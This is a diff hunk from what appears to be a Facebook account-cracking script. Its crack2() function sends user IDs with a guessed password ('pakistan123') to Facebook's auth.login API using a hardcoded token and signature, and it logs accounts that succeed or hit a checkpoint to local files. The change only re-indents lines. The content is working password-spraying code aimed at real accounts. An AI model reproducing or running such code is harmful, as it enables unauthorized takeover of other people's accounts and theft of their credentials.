@@ -577,23 +577,23 @@ def crack2():
 		                                                                                            ok.write(uid+" | "+pass11+"\n")
 		                                                                                            ok.close()
 		                                                                                            oks.append(uid)
-													 else:
-		                                                    	                  	             pass12="pakistan123"
-		                                                    	                                     q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass12 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                                                             d=json.loads(q)
-		                                                                                             if 'www.facebook.com' in d['error_msg']:
-		                                                                                                 print("[CP] "+uid+" | "+pass12)
-		                                                                                                 cp=open("save/cp.txt","a")
-		                                                                                                 cp.write(uid+" | "+pass12+"\n")
-		                                                                                                 cp.close()
-		                                                                                                 cps.append(uid)
-		                                                                                             else:
-		                                                                                                 if 'access_token' in d:
-		                                                                                                     print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass12+"\x1b[1;0m")
-		                                                                                                     ok=open("save/ok.txt","a")
-		                                                                                                     ok.write(uid+" | "+pass12+"\n")
-		                                                                                                     ok.close()
-		                                                                                                     oks.append(uid)
+													else:
+		                                                    	                  	            pass12="pakistan123"
+		                                                    	                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass12 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+		                                                                                            d=json.loads(q)
+		                                                                                            if 'www.facebook.com' in d['error_msg']:
+		                                                                                                print("[CP] "+uid+" | "+pass12)
+		                                                                                                cp=open("save/cp.txt","a")
+		                                                                                                cp.write(uid+" | "+pass12+"\n")
+		                                                                                                cp.close()
+		                                                                                                cps.append(uid)
+		                                                                                            else:
+		                                                                                                if 'access_token' in d:
+		                                                                                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass12+"\x1b[1;0m")
+		                                                                                                    ok=open("save/ok.txt","a")
+		                                                                                                    ok.write(uid+" | "+pass12+"\n")
+		                                                                                                    ok.close()
+		                                                                                                    oks.append(uid)
 										
 															
 		except:
